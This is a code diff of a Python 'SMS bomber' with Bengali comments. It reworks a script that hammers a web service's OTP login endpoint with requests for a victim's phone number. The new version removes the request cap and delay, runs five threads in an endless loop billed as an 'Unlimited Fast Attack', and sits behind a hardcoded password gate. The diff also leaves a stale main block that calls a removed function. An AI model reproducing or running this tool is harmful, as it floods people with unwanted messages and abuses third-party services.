@@ -2,108 +2,96 @@ import requests
 import time
 import os
 import signal
-from requests.exceptions import RequestException, ConnectionError, Timeout
+import threading
+from requests.exceptions import RequestException
 
-# --- Handle CTRL+C to Exit ---
+# --- স্ক্রিন ক্লিয়ার ফাংশন ---
+def clear():
+    os.system('clear' if os.name == 'posix' else 'cls')
+
+# --- সিগন্যাল হ্যান্ডলার (CTRL+C) ---
 def signal_handler(sig, frame):
-    print("\n\n\033[1;31m[-] Stopping the tool... Good Bye! \033[0m")
-    exit(0)
+    print("\n\033[1;31m[-] টুলটি বন্ধ করা হচ্ছে... বিদায়!\033[0m")
+    os._exit(0)
 
 signal.signal(signal.SIGINT, signal_handler)
 
-# --- Password Protection ---
+# --- প্রিমিয়াম ব্যানার ---
+def show_banner():
+    clear()
+    banner = """
+\033[1;36m  _    _ _    _ _   _ _______ ______ _____  
+ | |  | | |  | | \ | |__   __|  ____|  __ \ 
+ | |__| | |  | |  \| |  | |  | |__  | |__) |
+ |  __  | |  | | . ` |  | |  |  __| |  _  / 
+ | |  | | |__| | |\  |  | |  | |____| | \ \ 
+ |_|  |_|\____/|_| \_|  |_|  |______|_|  \_\
+                                            
+      \033[1;33m>>> PREMIUM HUNTER MODE v3.0 <<<\033[0m
+\033[1;32m-----------------------------------------------
+ \033[1;37m[*] Developed By : \033[1;35m@saeid9.90
+ \033[1;37m[*] Version      : \033[1;35mPro Unlimited
+\033[1;32m-----------------------------------------------\033[0m
+    """
+    print(banner)
+
+# --- পাসওয়ার্ড সুরক্ষা ---
 def check_password():
-    os.system('clear')
-    correct_pass = "saeid9.90"  # আপনার দেওয়া পাসওয়ার্ড
-    print("\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
-    print("\033[1;33m          🔐 SECURITY CHECK 🔐\033[0m")
-    print("\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
+    clear()
+    correct_pass = "saeid9.90"
+    print("\033[1;33m" + "="*45)
+    print("\033[1;36m       🛡️  SECURITY CHECK - ACCESS CONTROL 🛡️")
+    print("\033[1;33m" + "="*45 + "\033[0m")
     
-    user_pass = input("\033[1;34m[?] Enter Password to Access: \033[0m")
+    user_pass = input("\n\033[1;34m[?] Enter Access Password: \033[0m")
     
     if user_pass == correct_pass:
-        print("\033[1;32m\n✅ Access Granted! Welcome @saeid9.90\033[0m")
-        time.sleep(2)
+        print("\n\033[1;32m[✓] Access Granted! Welcome back Saeid.\033[0m")
+        time.sleep(1.5)
         return True
     else:
-        print("\033[1;31m\n❌ Access Denied! Wrong Password.\033[0m")
-        time.sleep(2)
+        print("\n\033[1;31m[!] Wrong Password! Access Denied.\033[0m")
         exit()
 
-# --- Professional Large Banner ---
-def show_banner():
-    os.system('clear')
-    large_banner = """
-\033[1;32m
-██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
-██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
-███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
-██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
-██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
-╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
+# --- রিকোয়েস্ট পাঠানোর ফাংশন ---
+TARGET_API = "https://api-dynamic.bloncapealive.com/v2/auth/login?country=RS&platform=web&language=es"
 
-███╗   ███╗ ██████╗ ██████╗ ███████╗
-████╗ ████║██╔═══██╗██╔══██╗██╔════╝
-██╔████╔██║██║   ██║██║   ██║█████╗  
-██║╚██╔╝██║██║   ██║██║   ██║██╔══╝  
-██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗
-╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
-\033[1;36m
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-\033[1;33m  🌟 Developed by : @saeid9.90
-\033[1;33m  🚀 Tool Version : 2.0 (Pro)
-\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-\033[0m
-    """
-    print(large_banner)
+def send_sms(number):
+    try:
+        # এখানে API-এর প্রয়োজনীয় ডাটা পাঠানো হচ্ছে
+        payload = {"country": "RS", "platform": "web", "language": "es", "number": number}
+        response = requests.post(TARGET_API, json=payload, timeout=5)
+        
+        if response.status_code == 200:
+            print(f"\033[1;32m[+] Success -> \033[1;37m{number}\033[0m")
+        else:
+            print(f"\033[1;31m[-] Failed (Code: {response.status_code})\033[0m")
+    except:
+        pass
 
-TARGET_API = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
-DELAY_SECONDS = 2  
-
-def send_continuous_requests_fast():
-    check_password() # পাসওয়ার্ড চেক করবে
+# --- মেইন কন্ট্রোলার ---
+def start_attack():
+    check_password()
     show_banner()
     
+    num = input("\033[1;34m[?] Target Number: \033[0m").strip()
+    print(f"\n\033[1;33m[*] Starting Unlimited Fast Attack on: {num}")
+    print("\033[1;31m[*] Press CTRL+C to Stop\n\033[0m")
+
+    # আনলিমিটেড থ্রেডিং লুপ
     while True:
-        user_number = input("\033[1;34m👤 Enter Phone Number (e.g., 01xxxxxxxxx): \033[0m").strip()
-        if user_number.isdigit() and len(user_number) >= 11:
-            break
-        else:
-            print("\033[1;31m❌ Invalid Number! Try again. \033[0m")
+        # এক সাথে ৫টি করে থ্রেড চালু হবে (স্পিড বাড়ানোর জন্য)
+        threads = []
+        for _ in range(5): 
+            t = threading.Thread(target=send_sms, args=(num,))
+            t.start()
+            threads.append(t)
+        
+        for t in threads:
+            t.join() # থ্রেডগুলো শেষ হওয়া পর্যন্ত অপেক্ষা করবে
 
-    while True:
-        try:
-            amount = int(input("\033[1;34m🔢 Number of requests? : \033[0m"))
-            if amount > 0: break
-        except ValueError:
-            print("\033[1;31m❌ Enter a valid number. \033[0m")
-            
-    print(f"\n\033[1;32m🚀 Starting requests for {user_number}... \033[0m\n")
-    
-    success_count = 0
-    fail_count = 0
-
-    for i in range(amount):
-        request_number = i + 1
-        try:
-            print(f"\033[1;36m[{request_number}/{amount}] Sending request...", end="\r")
-            response = requests.post(TARGET_API, json={"country": "BD", "platform": "web", "language": "en", "number": user_number, "operator": "bd-otp-test"}, timeout=10)
-            
-            if response.status_code == 200:
-                print(f"✅ Request {request_number} sent!      ")
-                success_count += 1
-            else:
-                print(f"⚠️ Request {request_number} failed.      ")
-                fail_count += 1
-
-            if request_number < amount:
-                time.sleep(DELAY_SECONDS)
-            
-        except:
-            print(f"\n\033[1;31m❌ Error occurred. \033[0m")
-            break
-
-    print("\n\033[1;32m✅ Done! Success: {} | Failed: {}\033[0m".format(success_count, fail_count))
+if __name__ == "__main__":
+    start_attack()
 
 if __name__ == "__main__":
     send_continuous_requests_fast()
